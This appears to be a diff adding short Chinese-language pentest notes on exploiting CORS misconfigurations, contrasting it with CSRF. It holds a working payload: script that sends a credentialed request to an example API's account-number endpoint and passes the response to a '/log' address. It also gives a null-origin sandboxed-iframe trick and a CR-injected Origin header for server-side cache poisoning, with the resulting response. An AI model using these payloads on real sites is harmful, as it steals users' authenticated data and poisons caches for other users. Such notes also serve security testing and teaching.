@@ -1,0 +1,30 @@
+针对CORS，Access-Control-Allow-Credentials: true 是关键。
+CORS仅仅对cookie类认证有用，对header authtication没有用。
+CORS可以获取response，但CSRF仅能让目标用户的浏览器发出request，无法获取服务器响应数据。
+CSRF使用HTML来构建请求，无需考虑同源策略，但请求数据内容受限；使用AJax来构建请求（比如对JSON的POST请求），其实就是CORS攻击，需要验证服务器同源策略。
+
+基本payload
+
+<script>
+   var req = new XMLHttpRequest();
+   req.onload = reqListener;
+   req.open("GET", "https://api.contosoapp.com/v2/getAccountNumber ", true);
+   req.withCredentials = true;
+   req.send();
+   function reqListener() {
+       location='/log?resp='+this.responseText;
+   };
+</script> 
+
+The null origin：
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src='data:text/html,<script>*cors stuff here*</script>’></iframe>
+
+高级技巧：
+1.Client-Side cache poisoning： reflected XSS in a custom HTTP header --> CORS --> client-side caching
+2.Server-side cache poisoning: 如果服务器未对CORS值中特殊字符做校验，利用\r等特殊字符，可实现修改response的header。 如果服务器使用cache，则可攻击其他用户。
+GET / HTTP/1.1
+Origin: z[0x0d]Content-Type: text/html; charset=UTF-7
+
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: z
+Content-Type: text/html; charset=UTF-7
